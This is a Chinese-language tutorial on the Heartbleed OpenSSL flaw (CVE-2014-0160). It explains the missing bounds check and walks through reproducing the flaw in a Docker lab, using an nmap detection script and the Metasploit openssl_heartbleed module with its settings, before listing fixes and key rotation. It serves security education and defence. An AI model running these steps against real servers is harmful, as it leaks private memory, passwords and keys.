# Heartbleed

心脏出血（英语：Heartbleed），也简称为心血漏洞，是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。它于2012年被引入了软件中，2014年4月首次向公众披露。只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。此问题的原因是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过滤，即可以读取的数据比应该允许读取的还多。HeartBleed主要存在与OpenSSL的1.0.1版本到1.0.1f版本。利用该漏洞，攻击者可以远程读取服务器内存中64K的数据，获取内存中的敏感信息。

# 漏洞描述

Heartbleed漏洞，这项严重缺陷(CVE-2014-0160)的产生是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。

# 漏洞原理

OpenSSL“心脏出血”漏洞的问题出现在openSSL处理TLS心跳的过程中，TLS心跳的流程是：A向B发送请求包，B收到包后读取这个包的内容(data)，并返回一个包含有请求包内容的响应包。请求包的内容(data)中包含有包的类型(type)和数据长度等信息。  
当B收到A的请求包后，并没有的验证A包的实际长度，而是简单的把请求包data中说明的长度当作data的实际长度，于是当请求包中说明的长度与请求包数据实际长度不同时，问题就产生了。假设A构造一个请求包，它的实际内容长度只有1，而却告诉B的它的长度是65535，那么B接受到这个包后就会把A的内容完全当作65535来处理，其实到这里，问题还并不严重，最严重的问题出在，心跳的响应包还需要附带请求包的全部内容，这就需要程序做一次将请求包的数据从它所在的内存拷贝到响应包的内存里的操作。  
这下就出大问题了，当拷贝的时候，程序认为A包的内容长度是65535个字节，结果A包在内存里面实际只有1个字节，于是程序不仅拷贝出了A包的内容，还“傻傻”地将A包数据在内存中位置后额外的65534个字节拷贝进了响应包里，并将这个响应包发还给了A，于是A便轻易地获得了B内存中这65534个字节的数据。想象一下，如果这65534个字节数据中包括一些敏感信息，那么后果将非常严重。而且A还可以简单地通过连续的发送心跳包，获取B机器内存中n个65534字节的数据，这个漏洞不愧是2014年“最佳漏洞”。

# 影响版本

OpenSSL 1.0.1版本

# 漏洞复现

## 环境介绍

靶机：centos7 192.168.139.136  
攻击机：kali 192.168.139.129  
确保两台测试机网络能通

### 环境搭建

使用docker+vulhub搭建漏洞环境，在centos7上搭建vulhub的步骤如下：

  1. 安装docker依赖包

命令：yum install -y yum-utils device-mapper-persistent-data lvm2

![](https://image.3001.net/images/20230809/1691548322_64d2faa29478d31c37db9.png!small)

  

  2. 安装docker

命令：yum install docker

![](https://image.3001.net/images/20230809/1691548365_64d2facd58432a820712f.png!small)

  

  3. 启动docker（页面没有显示）

命令：systemctl start docker

![](https://image.3001.net/images/20230809/1691548399_64d2faef999b3fb9c8e4f.png!small)

  

  4. centos7下安装git

命令：yum install -y git

![](https://image.3001.net/images/20230809/1691548429_64d2fb0d857e3c4448cbd.png!small)

  

  5. 下载vulhub

git clone +下载地址  
命令：git clone <https://github.com/vulhub/vulhub.git>

![](https://image.3001.net/images/20230809/1691548454_64d2fb26dc324ae879127.png!small)

  

  6. 进入vulhub目录中，找到CVE-2014-0160，并进入,输入命令docker-compose up -d运行漏洞环境

命令：ls #查看所有漏洞目录

![](https://image.3001.net/images/20230809/1691548525_64d2fb6d453cf33b88ae0.png!small)

命令：cd openssl #进入该目录  
ls

![](https://image.3001.net/images/20230809/1691548547_64d2fb839bc63001c12e5.png!small)

命令：docker-compose up -d #运行漏洞环境

![](https://image.3001.net/images/20230809/1691548569_64d2fb9973fb0bec4a67b.png!small)

  

  7. 查看运行情况

命令：docker ps

![](https://image.3001.net/images/20230809/1691548604_64d2fbbc620a25f2e13d3.png!small)

## 复现过程

## 信息收集

### 1\. 使用Nmap进行扫描

命令：nmap -sV -T4 192.168.139.136

![](https://image.3001.net/images/20230809/1691548629_64d2fbd56a95d6b097d15.png!small)

### 2\. 使用Nmap漏洞扫描脚本对8443端口进行扫描检测如下：

命令：nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.139.136

![](https://image.3001.net/images/20230809/1691548666_64d2fbfabdfb6981a55b9.png!small)

## 使用MSF框架攻击

### 1\. 进入msfconsol

命令：msfconsole  
![](https://image.3001.net/images/20230809/1691548709_64d2fc25b2e1dc5a027f3.png!small)

### 2\. 搜索相关漏洞模块

命令：search heartbleed

![](https://image.3001.net/images/20230809/1691548734_64d2fc3eb4e5341072110.png!small)

### 3\. 使用攻击模块1

命令：use auxiliary/scanner/ssl/openssl_heartbleed

![](https://image.3001.net/images/20230809/1691548761_64d2fc59cdd15c8469706.png!small)

### 4\. 查看配置参数

命令：show options

![](https://image.3001.net/images/20230809/1691548787_64d2fc731de22712b9073.png!small)

### 5\. 配置参数

对required为yes但是current setting为空的项进行设置，这里我们只需要设置rhosts（靶机ip）  
命令：set rhosts 192.168.139.136 #靶机ip  
set rport 8443 #设置端口  
set verbose true #设置verbose为true是为了 看到泄露的信息

![](https://image.3001.net/images/20230809/1691548849_64d2fcb149f8be0b827ef.png!small)

### 6\. 进行攻击

命令：run  
这里就可以看到 靶机的64KB信息了（如果有人此时在登录web应用，还可以直接抓到账号密码等信息）。

![](https://image.3001.net/images/20230809/1691548904_64d2fce86fe1f4a0f3323.png!small)![](https://image.3001.net/images/20230809/1691548914_64d2fcf2d6365db430800.png!small)![](https://image.3001.net/images/20230809/1691548924_64d2fcfc46f84712bd30c.png!small)

# 修复方案

OpenSSL“心脏出血”漏洞（CVE-2014-0160）受影响的OpenSSL版本：  
OpenSSL 1.0.2-beta  
OpenSSL 1.0.1 - OpenSSL 1.0.1f  
要解决此漏洞，简单粗暴的方法就是升级openSSL软件。  
建议服务器管理员或使用1.0.1g版，或使用-DOPENSSL_NO_HEARTBEATS选项重新编译OpenSSL，从而禁用易受攻击的功能，直至可以更新服务器软件。

1\. 将受影响的服务器下线，避免它继续泄露敏感信息。  
2\. 停止旧版的 openssl 服务，升级 openssl 到新版本，并重新启动。  
3\. 生成新密钥。（因为攻击者可能通过漏洞获取私钥。）将新密钥提交给你的CA，获得新的认证之后在服务 器上安装新密钥。  
4\. 服务器上线。  
5\. 撤销旧认证。  
6\. 撤销现有的会话cookies。  
7\. 要求用户修改密码。  
 **Heartbleed 是在 8 年多前被发现并修补的，然而许多服务器仍然存在 Heartbleed 漏洞**

